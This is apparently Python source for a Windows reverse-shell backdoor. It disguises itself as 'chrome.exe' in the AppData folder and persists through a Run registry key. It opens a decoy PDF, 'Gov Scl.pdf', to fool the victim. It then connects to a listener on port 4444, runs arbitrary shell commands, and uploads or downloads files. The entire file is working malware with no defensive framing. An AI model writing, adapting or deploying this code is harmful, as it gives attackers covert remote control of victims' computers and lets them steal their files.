import socket
import subprocess
import json
import os,sys
import base64
import shutil


class Backdoor:
    def __init__(self,ip,port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def persistence(self):
        
        file_loc = os.environ["appdata"] + "\\chrome.exe"
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable,file_loc)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Tata /t REG_SZ /d "'+file_loc+'"',shell = True)

    def execute_command(self,command):
        NULL = open(os.devnull,"wb") 
        return subprocess.check_output(command,shell=True,universal_newlines=True,stderr=NULL,stdin=NULL)
        
    def directory(self,path):
        os.chdir(path)
        return "\n"+os.getcwd()+">"

    def send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048).decode("utf-8")
                print('received')
                return json.loads(json_data)
            
            except ValueError:
                if json_data =="":
                    break
                print('continue')
                continue
                    

    def read_file(self,path):
        
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    def write_file(self,filename,content):
        with open(filename,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successfull"

        
    def main(self):
        while True:
            
            try:
                command = self.receive()
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) >=2 :
                    data = self.directory(" ".join(command[1:10]))

                elif command[0] == "download":
                    file_name = " ".join(command[1:5])
                    data = self.read_file(file_name).decode()
                
                elif command[0] == "upload":
                    path = " ".join(command[1:-1]) # [C:\python,folder\hello,world.txt] = C:\python folder\hello world.txt
                    file_name = path.split("\\")[-1] # [C:,python folder,hello world.txt] 
                    data = self.write_file(file_name,command[-1].encode())
                else:
                    data = self.execute_command(command)
                    
            except KeyboardInterrupt:
                data = "User perform keyboard interruption. "
            except Exception:
                data = "[-] Command Not Found!"

            self.send(data)


file= sys._MEIPASS + "Gov Scl.pdf"
subprocess.Popen(file,shell=True)

while 1:
    try:
        backdoor = Backdoor("127.0.0.1",4444)
        backdoor.main()
        break
    except Exception:
        continue
